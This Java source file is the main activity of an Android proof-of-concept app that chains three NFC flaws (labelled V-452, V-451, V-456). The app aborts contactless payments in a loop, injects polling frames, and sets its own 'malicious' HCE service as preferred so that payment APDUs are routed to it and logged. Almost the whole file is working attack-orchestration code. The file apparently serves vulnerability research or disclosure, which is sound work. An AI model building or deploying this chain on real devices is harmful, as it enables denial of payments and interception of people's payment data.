package com.poc.nfchijack;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

/**
 * NFC Payment Hijack PoC — Control Panel
 *
 * Demonstrates the full attack chain:
 *   V-452: notifyHceDeactivated (zero-perm payment DoS)
 *   V-451: notifyPollingLoop (zero-perm NFC frame injection)
 *   V-456: setPreferredService (foreground HCE hijack)
 *
 * Required permissions: android.permission.NFC (normal, auto-granted)
 * Target: Android 15+ (API 35+) with NFC module
 */
public class MainActivity extends Activity {
    private static final String TAG = "NfcHijackPoC";

    private TextView mStatusText;
    private TextView mLogText;
    private Button mBtnTestBinder;
    private Button mBtnStartKill;
    private Button mBtnStopKill;
    private Button mBtnInjectPolling;
    private Button mBtnSetPreferred;
    private Button mBtnFullAttack;
    private Button mBtnFingerprint;

    private PollingInjector mPollingInjector;
    private boolean mKillRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mStatusText = findViewById(R.id.status_text);
        mLogText = findViewById(R.id.log_text);
        mBtnTestBinder = findViewById(R.id.btn_test_binder);
        mBtnStartKill = findViewById(R.id.btn_start_kill);
        mBtnStopKill = findViewById(R.id.btn_stop_kill);
        mBtnInjectPolling = findViewById(R.id.btn_inject_polling);
        mBtnSetPreferred = findViewById(R.id.btn_set_preferred);
        mBtnFullAttack = findViewById(R.id.btn_full_attack);
        mBtnFingerprint = findViewById(R.id.btn_fingerprint);

        mPollingInjector = new PollingInjector();

        mBtnTestBinder.setOnClickListener(v -> testBinderAccess());
        mBtnStartKill.setOnClickListener(v -> startKill());
        mBtnStopKill.setOnClickListener(v -> stopKill());
        mBtnInjectPolling.setOnClickListener(v -> injectPolling());
        mBtnSetPreferred.setOnClickListener(v -> setPreferredService());
        mBtnFullAttack.setOnClickListener(v -> fullAttackChain());
        mBtnFingerprint.setOnClickListener(v -> fingerprint());

        appendLog("PoC initialized. Press 'Test Binder' first.");
        appendLog("Required: Android 15+ with NFC enabled");
        appendLog("Permissions needed: NONE (only auto-granted NFC)");
    }

    /**
     * Step 0: Verify we can access the NFC binder without any special permission.
     */
    private void testBinderAccess() {
        appendLog("\n--- Testing Binder Access ---");

        Object adapter = ReflectionHelper.getNfcAdapterInterface();
        if (adapter != null) {
            appendLog("[OK] Got INfcAdapter binder!");
            appendLog("  Interface: " + adapter.getClass().getName());
            mStatusText.setText("Status: Binder acquired — attack ready");
            mStatusText.setTextColor(0xFF00CC00);
        } else {
            appendLog("[FAIL] Could not get INfcAdapter binder");
            appendLog("  Device may not have NFC or service name differs");
            mStatusText.setText("Status: Binder acquisition failed");
            mStatusText.setTextColor(0xFFCC0000);
            return;
        }

        appendLog("[OK] Using raw transact — V-451/V-452 ready");
        appendLog("  V-456 uses CardEmulation public API (foreground only)");
    }

    /**
     * V-452: Start continuous HCE deactivation — kills ALL NFC payments.
     */
    private void startKill() {
        appendLog("\n--- V-452: Starting HCE Kill Loop ---");
        appendLog("Any NFC payment in progress will be terminated.");
        appendLog("New payments will fail immediately.");

        Intent intent = new Intent(this, NfcKillService.class);
        intent.setAction(NfcKillService.ACTION_START);
        startService(intent);
        mKillRunning = true;

        mStatusText.setText("Status: HCE Kill ACTIVE — NFC payments disabled");
        mStatusText.setTextColor(0xFFFF0000);
        appendLog("[V-452] Kill loop started (50ms interval)");
    }

    private void stopKill() {
        Intent intent = new Intent(this, NfcKillService.class);
        intent.setAction(NfcKillService.ACTION_STOP);
        startService(intent);
        mKillRunning = false;

        mStatusText.setText("Status: Kill loop stopped");
        mStatusText.setTextColor(0xFF888888);
        appendLog("[V-452] Kill loop stopped");
    }

    /**
     * V-451: Inject NFC polling frames to trigger HCE service activation.
     */
    private void injectPolling() {
        appendLog("\n--- V-451: Injecting Polling Frames ---");

        boolean success = mPollingInjector.injectFullPollingSequence();
        if (success) {
            appendLog("[OK] Polling sequence injected successfully!");
            appendLog("  NFC-A WUPA + REQA frames sent to HAL");
            appendLog("  HCE services with PollingLoopFilter should activate");
        } else {
            appendLog("[FAIL] Polling injection failed");
            appendLog("  notifyPollingLoop may be protected on this build");
        }
    }

    /**
     * V-456: Set our malicious HCE service as preferred.
     */
    private void setPreferredService() {
        appendLog("\n--- V-456: Setting Preferred HCE Service ---");

        ComponentName hijackService = new ComponentName(this, HijackHceService.class);
        boolean success = ReflectionHelper.callSetPreferredService(hijackService);

        if (success) {
            appendLog("[OK] HijackHceService set as preferred!");
            appendLog("  ALL NFC APDUs will now route to our service");
            appendLog("  Tap phone to NFC reader to see intercepted data");
        } else {
            appendLog("[FAIL] setPreferredService failed");
            appendLog("  May need to use CardEmulation.getInstance() instead");
            // Fallback: try the public API
            tryPublicSetPreferred();
        }
    }

    private void tryPublicSetPreferred() {
        try {
            android.nfc.NfcAdapter adapter = android.nfc.NfcAdapter.getDefaultAdapter(this);
            if (adapter == null) {
                appendLog("  NfcAdapter is null — NFC not available");
                return;
            }
            android.nfc.cardemulation.CardEmulation cardEm =
                    android.nfc.cardemulation.CardEmulation.getInstance(adapter);
            ComponentName hijack = new ComponentName(this, HijackHceService.class);
            boolean result = cardEm.setPreferredService(this, hijack);
            appendLog("  Public API setPreferredService: " + (result ? "SUCCESS" : "FAILED"));
        } catch (Exception e) {
            appendLog("  Public API failed: " + e.getMessage());
        }
    }

    /**
     * Full attack chain: Kill → Inject → Hijack
     */
    private void fullAttackChain() {
        appendLog("\n═══════════════════════════════════════");
        appendLog("  FULL ATTACK CHAIN: V-452 + V-451 + V-456");
        appendLog("═══════════════════════════════════════");

        // Step 1: Set preferred service (need foreground)
        appendLog("\n[Step 1/3] Setting preferred HCE service...");
        setPreferredService();

        // Step 2: Start kill loop
        appendLog("\n[Step 2/3] Starting HCE kill loop...");
        startKill();

        // Step 3: Inject polling to trigger new session
        appendLog("\n[Step 3/3] Injecting polling frames...");
        new android.os.Handler(getMainLooper()).postDelayed(() -> {
            mPollingInjector.injectPaymentTrigger();
            appendLog("\n[READY] Attack chain active:");
            appendLog("  - Existing payments: KILLED (V-452)");
            appendLog("  - Polling injection: ACTIVE (V-451)");
            appendLog("  - HCE hijack: ARMED (V-456)");
            appendLog("\n  Tap phone to NFC reader to demonstrate interception.");
            appendLog("  Watch logcat for 'HijackHCE' tag to see captured APDUs.");
        }, 500);
    }

    /**
     * Fingerprint installed NFC services by injecting different tech types.
     */
    private void fingerprint() {
        appendLog("\n--- V-451: Fingerprinting NFC Services ---");
        appendLog("Injecting NFC-A, NFC-B, NFC-F frames...");
        appendLog("Watch logcat for HCE service activations.");
        mPollingInjector.fingerprintServices();
        appendLog("[DONE] Check logcat for CardEmulationManager events");
    }

    private void appendLog(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> {
            if (mLogText != null) {
                mLogText.append(msg + "\n");
            }
        });
    }

    @Override
    protected void onDestroy() {
        if (mKillRunning) stopKill();
        if (mPollingInjector.isRunning()) mPollingInjector.stop();
        super.onDestroy();
    }
}
